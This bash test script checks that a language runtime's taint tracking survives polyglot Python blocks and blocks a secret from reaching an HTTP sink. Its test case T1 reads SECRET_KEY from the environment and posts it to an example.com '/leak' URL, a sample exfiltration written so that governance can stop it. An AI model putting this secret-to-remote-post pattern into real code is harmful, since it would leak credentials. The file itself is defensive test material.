#!/usr/bin/env bash
# test_taint_polyglot_vm001.sh — Finding V-VM-001: Taint propagates through polyglot blocks
# A tainted value passed as bound input to a polyglot block must produce a tainted output.

set -euo pipefail
NAAB="${1:-$(dirname "$0")/../../build/naab-lang}"
PASS=0; FAIL=0
ok()   { echo "  PASS: $1"; PASS=$((PASS + 1)); }
fail() { echo "  FAIL: $1"; FAIL=$((FAIL + 1)); }

WORKDIR="${HOME}/.naab/test_vm001_$$"
mkdir -p "$WORKDIR"
cleanup() { rm -rf "$WORKDIR"; }
trap cleanup EXIT

echo "=== test_taint_polyglot_vm001.sh ==="
echo ""

# ---------------------------------------------------------------------------
# Governance config: env.get is a taint source, http.post is a sink
#
# This config used to be {"mode":"HARD","taint_sources":[...],"sinks":[...]}:
# none of those are keys the engine reads (they are taint_tracking.sources /
# .sinks, and "HARD" is not a mode), and taint tracking is off by default. The
# suite passed anyway, because enforce mode upgrades the sandbox to `standard`,
# which refuses env.get itself -- the broad greps below matched that refusal
# ("denied"), and taint tracking was never reached. `elevated` lets env.get
# through so the taint path is what decides; the exact-message arms and the
# C1 control below are what prove it.
# ---------------------------------------------------------------------------
cat > "$WORKDIR/govern.json" << 'EOF'
{
  "version": "5.0",
  "mode": "enforce",
  "security": { "sandbox_level": "elevated" },
  "taint_tracking": { "enabled": true, "level": "hard", "sources": ["env.get"], "sinks": ["http.post"] }
}
EOF

# ---------------------------------------------------------------------------
# T1: Tainted value passed through python block → result should still be tainted
#     → http.post with result must be BLOCKED
# ---------------------------------------------------------------------------
echo "[T1] Tainted input through polyglot block propagates to output (VM mode)"
cat > "$WORKDIR/test_t1.naab" << 'EOF'
use env
use http
main {
  let secret = env.get("SECRET_KEY")
  let cleaned = <<python[secret]
secret
>>
  http.post("https://example.com/leak", cleaned)
}
EOF

out=$(timeout 15 "$NAAB" "$WORKDIR/test_t1.naab" --vm 2>&1) || true
if grep <<<"$out" -qi "taint\|blocked\|governance\|sink\|denied"; then
    ok "http.post blocked — taint propagated through polyglot block"
else
    fail "http.post was NOT blocked — taint laundering possible: ${out:0:200}"
fi

echo ""

# ---------------------------------------------------------------------------
# T2: V-GOV-006: Even a CLEAN (untainted) variable through python block produces
#     a tainted output — all polyglot returns are unconditionally tainted when
#     governance is active. http.post must be BLOCKED.
# ---------------------------------------------------------------------------
echo "[T2] Clean input through polyglot block → output is tainted (V-GOV-006 unconditional)"
cat > "$WORKDIR/test_t2.naab" << 'EOF'
use http
main {
  let clean = "hello"
  let result = <<python[clean]
clean + "_processed"
>>
  http.post("https://example.com/ok", result)
}
EOF

out=$(timeout 15 "$NAAB" "$WORKDIR/test_t2.naab" --vm 2>&1) || ec=$?
ec=${ec:-0}
# V-GOV-006: polyglot output is ALWAYS tainted → http.post must be blocked.
# If Python is unavailable the polyglot block itself fails (different error).
if grep <<<"$out" -qi "taint\|blocked\|governance\|sink\|denied"; then
    ok "http.post blocked — V-GOV-006: polyglot output unconditionally tainted"
elif grep <<<"$out" -qi "python.*not.*found\|no executor\|executor.*python\|python.*unavail"; then
    echo "  SKIP: T2 — Python executor unavailable"
elif [[ "$ec" -ne 0 ]]; then
    ok "exited non-zero (polyglot or network failure acceptable): ${out:0:80}"
else
    fail "http.post was NOT blocked — V-GOV-006 polyglot taint not applied: ${out:0:200}"
fi

echo ""

# ---------------------------------------------------------------------------
# T3: Same script as T1 but with --no-governance → must run without error
# ---------------------------------------------------------------------------
echo "[T3] With --no-governance, taint laundering script runs without governance block"
# Run from a directory with NO project config. Since #244 a CLI flag may only
# tighten: --no-governance no longer switches off a govern.json the script
# discovers -- its remaining job is waiving the "no govern.json found" error.
# Pointed at $WORKDIR (whose config now really enables taint) T3 would be asking
# the flag to loosen a project policy, which it correctly refuses.
NOGOV="$(mktemp -d "${TMPDIR:-/tmp}/test_vm001_nogov.XXXXXX")"
trap 'cleanup; rm -rf "$NOGOV"' EXIT
cp "$WORKDIR/test_t1.naab" "$NOGOV/test_t1.naab"
out=$(timeout 15 "$NAAB" "$NOGOV/test_t1.naab" --vm --no-governance 2>&1) || ec=$?
ec=${ec:-0}
if grep <<<"$out" -qi "taint\|governance block\|hard block"; then
    fail "governance fired despite --no-governance: ${out:0:120}"
else
    ok "--no-governance: script not blocked by taint governance"
fi
# T3c CONTROL: T3 asserts an absence, which a program that never ran also
# satisfies. The same directory and flags must actually execute a program.
printf 'main {\n  print("T3C_RAN")\n}\n' > "$NOGOV/t3c.naab"
out=$(timeout 15 "$NAAB" "$NOGOV/t3c.naab" --vm --no-governance 2>&1 || true)
if grep -q "T3C_RAN" <<<"$out"; then
    ok "T3c control: programs run in the config-less directory"
else
    fail "T3c control: nothing ran in the config-less directory -- T3 proves nothing: ${out:0:200}"
fi

echo ""

# ---------------------------------------------------------------------------
# Exact arms. The greps above accept "governance" and "denied", so they also
# pass on a sandbox refusal of env.get -- which is what T1 matched for as long
# as this suite's config was inert. These require taint tracking's own message
# AND the HARD exit code. C1 is the control that the source is admitted at all.
# A missing Python executor is UNMEASURABLE, not a pass or a fail.
# ---------------------------------------------------------------------------
py_missing() { grep -qi "python.*not.*found\|no executor\|executor.*python\|python.*unavail\|Python support not available" <<<"$1"; }

echo "[T1x] T1 is refused by taint tracking itself (message + exit 3)"
rc=0; out=$(timeout 15 "$NAAB" "$WORKDIR/test_t1.naab" --vm 2>&1) || rc=$?
if [[ "$rc" -eq 3 ]] && grep -q "Taint tracking violation" <<<"$out"; then
    ok "polyglot round-trip: taint tracking blocked http.post (exit 3)"
elif py_missing "$out"; then
    echo "  SKIP: T1x — Python executor unavailable (UNMEASURABLE)"
else
    fail "expected a taint tracking violation with exit 3, got rc=$rc: ${out:0:300}"
fi

echo "[T2x] T2 is refused by taint tracking itself (V-GOV-006, message + exit 3)"
rc=0; out=$(timeout 15 "$NAAB" "$WORKDIR/test_t2.naab" --vm 2>&1) || rc=$?
if [[ "$rc" -eq 3 ]] && grep -q "Taint tracking violation" <<<"$out"; then
    ok "clean input: polyglot output tainted, http.post blocked (exit 3)"
elif py_missing "$out"; then
    echo "  SKIP: T2x — Python executor unavailable (UNMEASURABLE)"
else
    fail "expected a taint tracking violation with exit 3, got rc=$rc: ${out:0:300}"
fi

echo "[C1] CONTROL: the sandbox admits the taint source (env.get returns the value)"
cat > "$WORKDIR/test_c1.naab" << 'EOF'
use env
main {
  print("C1:" + env.get("SECRET_KEY"))
}
EOF
out=$(SECRET_KEY="c1_value" timeout 15 "$NAAB" "$WORKDIR/test_c1.naab" --vm 2>&1 || true)
if grep -q "C1:c1_value" <<<"$out"; then
    ok "env.get admitted -- taint, not the sandbox, decides T1"
else
    fail "env.get did not return the value -- an outer gate is deciding: ${out:0:300}"
fi

echo ""

TOTAL=$((PASS + FAIL))
echo "Results: ${PASS}/${TOTAL} passed"
[[ "$FAIL" -eq 0 ]]
